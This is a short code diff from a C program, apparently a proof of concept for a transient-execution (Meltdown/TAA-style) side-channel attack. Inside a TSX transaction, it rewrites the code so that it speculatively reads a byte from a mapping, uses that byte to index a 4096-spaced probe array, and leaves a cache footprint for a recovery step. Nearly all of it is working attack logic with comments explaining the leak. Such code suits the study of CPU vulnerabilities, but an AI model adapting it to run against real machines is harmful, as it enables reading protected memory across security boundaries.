@@ -43,10 +43,19 @@ int main(int argc, char *argv[])
 
     /* Begin transaction and recover value */
     if(xbegin() == (~0u)) {
-      maccess(mem + 4096 * mapping[0]);
+      /* Leak a byte speculatively from uncached mapping */
+      char byte = (char) mapping[0];
+      
+      /* Use leak byte as a index in probed mem array */
+      /* 4096 is here because probe array has 256 entries 4096 interval apart */
+      char *p = mem + (byte * 4096);
+
+      /* Access the byte to leave footprint in cache */
+      *(volatile char *)p;
       xend();
     }
     
+    /* Recover through probe mem array */
     recover();
   }
 
